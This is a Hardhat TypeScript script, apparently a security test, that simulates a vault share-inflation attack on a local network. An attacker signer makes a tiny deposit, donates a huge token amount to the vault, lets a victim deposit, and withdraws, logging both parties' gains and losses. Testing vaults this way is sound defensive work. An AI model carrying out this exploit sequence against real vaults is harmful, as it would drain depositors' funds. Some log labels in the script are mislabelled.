import hardhat from 'hardhat';
import {Contract} from "@ethersproject/contracts";
import {SignerWithAddress} from "@nomiclabs/hardhat-ethers/signers";
import {utilsTask} from "../../01_task/standard/utilsTask";
import {testStrategyTask} from "../01_task/testStrategyTask";
import {deployScompTask, vaultTask} from "../../01_task/sCompTask";
import {erc20Task} from "../../01_task/standard/erc20Task";
import hre from "hardhat";

const {run, ethers} = hardhat;

let nameConfig = "mim3crv"
let config: any;

// account
let deployer: SignerWithAddress;
let attacker: SignerWithAddress;
let victim: SignerWithAddress;

// contract deploy
let strategyContract: Contract;
let feeDistributionContract: Contract;
let surplusConverterV2Contract: Contract;

async function main(): Promise<void> {
    await run('compile');
    [deployer, attacker, victim] = await ethers.getSigners();
    config = await deployScompTask.getConfig(nameConfig)
}

main()
    .then(async () => {

        // INITIAL ACTION
        console.log(" ----- SETUP CONTRACT")
        const {
            sCompToken,
            ve,
            feeDistribution,
            surplusConverterV2,
            controller,
            timelockController,
            vaultOld,
            strategyOld
        } =
            await testStrategyTask.setupContractBase(config);

        const TestERC20 = await hre.ethers.getContractFactory("TestERC20");
        const testERC20Deployed = await TestERC20.deploy("TestERC20", "TEST");
        console.log("TestERC20 Token address : " + testERC20Deployed.address);
        await testERC20Deployed.mint(attacker.address, ethers.utils.parseEther("100000000000"));
        await testERC20Deployed.mint(victim.address, ethers.utils.parseEther("100000000000"));

        let oracleRouter = await deployScompTask.deployOracleRouter();

        let vault = await deployScompTask.deployVault(controller.address, testERC20Deployed.address, deployer.address, config.feeDeposit);

        let strategy = await deployScompTask.deployStrategy(
            config.nameStrategy, deployer.address, surplusConverterV2.address, controller.address, oracleRouter.address,
            testERC20Deployed.address, config.tokenCompoundAddress, config.tokenCompoundPosition, config.pidPool, config.feeGovernance, config.feeStrategist, config.feeWithdraw,
            config.curveSwapAddress, config.nElementPool, timelockController.address, config.versionStrategy
        );

        feeDistributionContract = feeDistribution;
        surplusConverterV2Contract = surplusConverterV2;
        strategyContract = strategy;

        let balanceAttackerInitial = await utilsTask.getBalanceERC20(attacker.address, testERC20Deployed.address)
        let balanceVictimInitial = await utilsTask.getBalanceERC20(victim.address, testERC20Deployed.address)
        console.log("------ Attacker want balance : " + ethers.utils.formatEther(balanceAttackerInitial));
        console.log("------ Victim want balance : " + ethers.utils.formatEther(balanceVictimInitial));

        let depositAttacker = ethers.utils.parseEther("10")
        let transferAttacker = ethers.utils.parseEther("50000000000")
        let depositVictim = ethers.utils.parseEther("100000000000")

        console.log("--- DEPOSIT ATTACKER: AMOUNT ", ethers.utils.formatEther(depositAttacker))
        await erc20Task.approve(testERC20Deployed.address, attacker, vault.address, depositAttacker);
        await vaultTask.deposit(vault.address, attacker, depositAttacker);
        console.log("------ Attacker share balance: " + ethers.utils.formatEther(await utilsTask.getBalanceERC20(attacker.address, vault.address)));

        console.log("--- TRANSFER ATTACKER: AMOUNT ", ethers.utils.formatEther(transferAttacker))
        await erc20Task.transfer(testERC20Deployed.address, attacker, vault.address, transferAttacker);
        console.log("------ Attacker want balance: " + ethers.utils.formatEther(await utilsTask.getBalanceERC20(attacker.address, config.wantAddress)));

        console.log("--- DEPOSIT VICTIM: AMOUNT ", ethers.utils.formatEther(depositVictim))
        await erc20Task.approve(testERC20Deployed.address, victim, vault.address, depositVictim);
        await vaultTask.deposit(vault.address, victim, depositVictim);
        console.log("------ Victim share balance: " + ethers.utils.formatEther(await utilsTask.getBalanceERC20(victim.address, vault.address)));

        console.log("--- WITHDRAW ALL ATTACKER")
        await vaultTask.withdrawAll(vault.address, attacker);
        console.log("------ Attacker share balance: " + ethers.utils.formatEther(await utilsTask.getBalanceERC20(attacker.address, vault.address)));
        console.log("------ Attacker want balance: " + ethers.utils.formatEther(await utilsTask.getBalanceERC20(attacker.address, testERC20Deployed.address)));

        console.log("--- WITHDRAW ALL VICTIM")
        await vaultTask.withdrawAll(vault.address, victim);
        console.log("------ Attacker share balance: " + ethers.utils.formatEther(await utilsTask.getBalanceERC20(victim.address, vault.address)));
        console.log("------ Attacker want balance: " + ethers.utils.formatEther(await utilsTask.getBalanceERC20(victim.address, testERC20Deployed.address)));

        let balanceAttackerFinal = await utilsTask.getBalanceERC20(attacker.address, testERC20Deployed.address)
        let diffAttacker = balanceAttackerFinal.sub(balanceAttackerInitial);
        let balanceVictimFinal = await utilsTask.getBalanceERC20(victim.address, testERC20Deployed.address)
        let diffVictim = balanceVictimFinal.sub(balanceVictimInitial);

        console.log("------ Attacker diff want balance : " + ethers.utils.formatEther(diffAttacker));
        console.log("------ Victim diff want balance : " + ethers.utils.formatEther(diffVictim));

        process.exit(0)
    })
    .catch((error: Error) => {
        console.error(error);
        process.exit(1);
    });

